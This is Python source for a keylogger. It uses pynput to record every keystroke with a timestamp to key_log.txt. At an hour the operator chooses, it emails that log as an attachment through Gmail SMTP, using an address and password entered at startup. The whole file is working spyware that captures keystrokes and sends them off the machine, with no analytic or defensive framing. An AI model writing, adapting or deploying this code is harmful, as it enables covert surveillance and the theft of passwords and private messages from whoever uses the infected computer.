# import modules
import datetime
import logging
import random
import smtplib
import threading
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput.keyboard import Listener


sender_email = input("Enter the email you would like your output file delivered to>> ")
email_password = input("Enter password associcated with email account above>> ")
time_to_send = int(input("Enter time you would like to have email delivered (24 hour clock Enter in range > [1-24]) >>"))

def send_mail(email, password):
    # Back structure to publish emails
    #user credentials
    fromaddr = email #your email
    toaddr = email     #recipient of email
    subject = "Python Log"     #what ever you want the subject of the email to be...
    mess = ["Logging has commenced!", "Let the logging begin!", "Time to log!"]
    #builds up the email
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = subject

    body = random.choice(mess)  #<---- whatever message you want here...
    # attach as a mime text part
    msg.attach(MIMEText(body, "plain"))

    #open file to be sent
    log_file = r"key_log.txt"   #<-----only tried in .txt file
    attachment = open(log_file, "r")
    #allows you to upload an attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload((attachment).read())
    #upload it in base 64
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment; filename= " + log_file)

    #attach to overall message

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(fromaddr, password)  # <-----input a password here

    server.sendmail(fromaddr, toaddr, text)
    server.quit()
# if no name it gets put into an empty string
log_dir = ""

########## this is the basic logging function###########
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format ='%(asctime)s: %(message)s:')
# library

def on_press(key):
    logging.info(str(key))
    # if key == Key.esc:
        # return false

#setting datetime to identify current time and associate it with the set time variable

count = 0
with Listener(on_press=on_press) as listener:
    
    while True:
        currentTimeOfDay = datetime.datetime.now()
        currentHour = currentTimeOfDay.hour
        sethour = time_to_send   #changes the time the email sends (24-hour clock)              
        if currentHour == sethour:
            if count == 0:
                send_mail(sender_email, email_password)
                count += 1
            elif count != 0:
                sethour += 1
            listener.join()
